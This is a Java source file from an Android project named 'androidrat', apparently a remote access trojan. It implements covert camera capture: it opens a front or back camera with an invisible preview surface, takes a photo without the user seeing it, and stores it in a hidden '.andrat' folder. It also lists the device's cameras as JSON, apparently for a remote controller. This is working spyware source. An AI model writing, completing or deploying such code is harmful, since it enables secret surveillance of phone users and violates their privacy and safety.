package com.ot.androidrat;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.os.Environment;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileOutputStream;

public class Camera {

    private static android.hardware.Camera camera;
    public byte[] imageBytes;

    public byte[] takePicture(int i){
        // 1 3 Front
        camera = android.hardware.Camera.open(i);
        android.hardware.Camera.Parameters parameters = camera.getParameters();
        camera.setParameters(parameters);
        try{
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }

        camera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, android.hardware.Camera camera) {
                releaseCamera();
                try{
                    Camera.this.imageBytes = data;
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                    FileOutputStream output = new FileOutputStream(Environment.getExternalStorageDirectory().toString() + "/.andrat/"+ System.currentTimeMillis()+".jpg");
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 20, output);
                }catch(Exception ex){
                    System.out.println(ex.getMessage());
                }
            }
        });
        return imageBytes;
    }

    private void releaseCamera(){
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    public static JSONObject findCameraList() {
        JSONObject cameras = new JSONObject();
        try {
            JSONArray list = new JSONArray();
            cameras.put("camList", true);

            // Search for available cameras
            int numberOfCameras = android.hardware.Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                android.hardware.Camera.CameraInfo info = new android.hardware.Camera.CameraInfo();
                android.hardware.Camera.getCameraInfo(i, info);
                if (info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Front");
                    jo.put("id", i);
                    list.put(jo);
                } else if (info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Back");
                    jo.put("id", i);
                    list.put(jo);
                } else {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Other");
                    jo.put("id", i);
                    list.put(jo);
                }
            }

            cameras.put("list", list);
            Log.i("Result", cameras.toString());

        } catch (JSONException e) {
            e.printStackTrace();
        }
        return cameras;
    }


}
